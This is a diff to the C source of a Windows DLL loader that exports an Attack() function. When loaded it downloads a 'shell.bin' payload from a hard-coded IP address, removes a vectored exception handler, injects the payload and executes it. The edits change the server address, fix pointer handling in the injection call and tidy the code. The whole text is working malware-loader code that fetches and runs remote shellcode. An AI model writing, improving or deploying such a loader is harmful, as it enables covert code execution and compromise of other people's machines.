@@ -2,7 +2,7 @@
 #include "common.h"
 
 unsigned char* pPayload = NULL;
-PSTR url = "192.168.231.130";
+PSTR url = "192.168.231.133";
 PSTR endpoint = "shell.bin";
 SIZE_T sSize = -1;
 
@@ -34,7 +34,7 @@ extern __declspec(dllexport) int Attack()
     if (!pRemoveVectoredExceptionHandler(pVehHandler))
         return -1;
 
-    if (!Inject(pPayload, sSize, &pInjectedPayload))
+    if (!Inject(&pPayload, sSize, &pInjectedPayload))
         return -1;
 
     Execute(pInjectedPayload);
@@ -46,14 +46,15 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
 {
     switch (dwReason)
     {
-        case DLL_PROCESS_ATTACH:
+        case DLL_PROCESS_ATTACH: {
             sSize = Download(&pPayload, url, endpoint, FALSE);
-            if(sSize == -1)
+            if (sSize == -1)
             {
                 printf("[!] Failed to fetch payload from server!\n");
                 return FALSE;
             }
             break;
+        }
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
         case DLL_PROCESS_DETACH:
